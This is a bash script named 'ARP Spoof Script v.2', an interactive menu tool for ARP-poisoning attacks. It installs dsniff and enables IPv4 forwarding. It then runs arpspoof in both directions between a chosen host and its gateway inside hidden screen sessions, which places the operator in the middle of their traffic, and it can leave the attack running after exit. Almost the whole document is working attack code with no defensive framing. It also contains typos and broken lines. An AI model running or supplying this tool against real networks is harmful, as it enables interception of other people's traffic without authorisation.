
#!/bin/bash
 
 
opening(){
    echo "                       ,;:::  ARP Spoof Script v.2        "
    echo "                   __||                                   "
    echo "            _____/LLLL\_                                  "
    echo "            \____SS PWN_|                                 "
    echo "         ~^~^~^~^~^~^~^~^~^~                              "
}
 
locked(){
    echo "                       ,;:::  ARP Spoof Script v.2        "
    echo "                   __||                                   "
    echo "            _____/LLLL\_          (TARGETS LOCKED)        "
    echo "            \____SS PWN_|                                 "
    echo "         ~^~^~^~^~^~^~^~^~^~                              "
}
 
running(){
    echo "                       ,;:::  ARP Spoof Script v.2        "
    echo "                   __||                                   "
    echo "            _____/LLLL\_          (TARGETS LOCKED)        "
    echo "            \____SS PWN_|         (ATTACK RUNNING)        "
    echo "         ~^~^~^~^~^~^~^~^~^~                              "
}
 
#check and install dependencies
dependcheck(){
    sinstall="null"
    ainstall="null"
    while true; do
        if [ -a /usr/bin/screen ]
        then
            break
        else
            if [ $sinstall != "null" ]
            then
                :
            else
                printf "Screen is required for this to work. Install now? (y/n) "
                read sinstall
                case $sinstall in
                    y|Y|yes)
                        gnome-terminal -- apt install screen -y; exit
                        sleep 3
                        ;;
                    n|N|no)
                        printf "Unable to continue without Screen\n"
                        exit 1
                        ;;
                    *)
                        printf "Unknown Input\n"
                        $sinstall=null
                        ;;
                esac
            fi
        fi
    done
    while true; do
        if [ -a /usr/sbin/arpspoof ]
        then
            break
        else
            if [ $ainstall != "null" ]
            then
                :
            else
                printf "Dsniff is required for this to work. Install now? (y/n) "
                read ainstall
                case $ainstall in
                    y|Y|yes)
                        screen -d -m -S install apt install dsniff -y; exit
                        printf "Installing.....\n"
                        sleep 3
                        ;;
                    n|N|no)
                        printf "Unable to continue without Dsniff.\n"
                        exit 1
                        ;;
                    *)
                        printf "Unknown Input\n"
                        ainstall=null
                        ;;
                esac
            fi
        fi
    done
}
 
#revision 2 of ARP Spoof script
#setting menu prompt status
ready=1
#check if user is root.
if [ $EUID -ne 0 ]
then
    printf "This script must be run with root privileges. Please re-run under Sudo command.\n\n"
    exit 1
else
    :
fi
 
#check for dependent installs
dependcheck
 
#background check if other sessions running
if ps aux | grep ARPWN | grep -q SCREEN
then
    printf "Looks like a session is already running. Would you like to display them? No jumps to main interface (y/n) "
    read end
    case $end in
        y|Y|yes)
            printf "Resumiung screen session...\n"
            gnome-terminal --screen -r ARPWN1
            gonme-terminal --screen -r ARPWN2
            exit 0
            ;;
        n|N|no)
            prinf "Configuring interface...\n"
            ready=3
            sleep 2
            ;;
    esac
else
    :
fi
#forwarding IPv4
if grep -q 1 /proc/sys/net/ipv4/ip_forward
then
    :
else
    printf "Enabling IPv4 forwarding\n"
    sleep 2
    echo 1 > /proc/sys/net/ipv4/ip_forward
    sleep 1
fi
 
#main interface
while true
do
clear
case $ready in
    1)
        opening
        ;;
    2)
        locked
        ;;
    3)
        running
        ;;
esac
printf "                    :: SELECT OPTION ::\n\n "
printf "1) Setup attack vectors\n"
printf " 2) Execute attack\n"
printf " 3) Display current attack\n"
printf " 4) Clear all settings\n"
printf " 5) Exit (return Ipv4 Forwarding)\n"
printf " 6) Exit (without returning IPv4 Forwarding)\n"
printf " 7) Exit (leaving attack running in the background)\n"
printf "Option: "
read option
case $option in
        1)
            clear
            printf "Target 1 (Host): "
            read target1
            printf "Target 2 (Gateway): "
            read target2
            touch ~/.config/int.txt
            ifconfig | echo > ~/.config/int.txt
            cat ~/.config/int.txt
            printf "Select NIC: "
            read interface
            rm ~/.config/int.txt
            ready=2
            ;;
        2)
            if [ $ready -ne 2 ]
            then
                printf "You need to select targets for this attack."
                sleep 1.5
            else
                printf "Running arp spoof in background screen socket....."
                sleep 3
                screen -d -m -S ARPWN1 sudo arpspoof -i $interface -t $target1 -r $target2
                screen -d -m -S ARPWN2 sudo arpspoof -i $interface -t $target2 -r $target1
                ready=3
            fi
            ;;
        3)
            if [ $ready -ne 3 ]
            then
                printf "You need to execute an attack first!"
                sleep 1.5
            else
                gnome-terminal -- screen -r ARPWN1
                gnome-terminal -- screen -r ARPWN2
            fi
            sleep 1.5
            clear
            ;;
        4)
            printf "Clearing settings....."
            target1=0
            target2=0
            interface=0
            ready=1
            sleep 1.5
            ;;
        5)
            printf "Shutting down attack.....\n"
            killall screen
            sleep 1
            printf "Returning IPv4 Forwarding.....\n"
            echo 0 > /proc/sys/net/ipv4/ip_forward
            sleep 1
            printf "Shutting down program\n"
            exit 0
            ;;
        6)
            printf "Shutting down attack.....\n"
            killall screen
            printf "Complete"
            exit 0
            ;;
        7)
            printf "Exiting interface.....\n"
            exit 0
            ;;
        *)
            printf "Unknown input, try again"
            sleep 1.5
            ;;
        esac
done
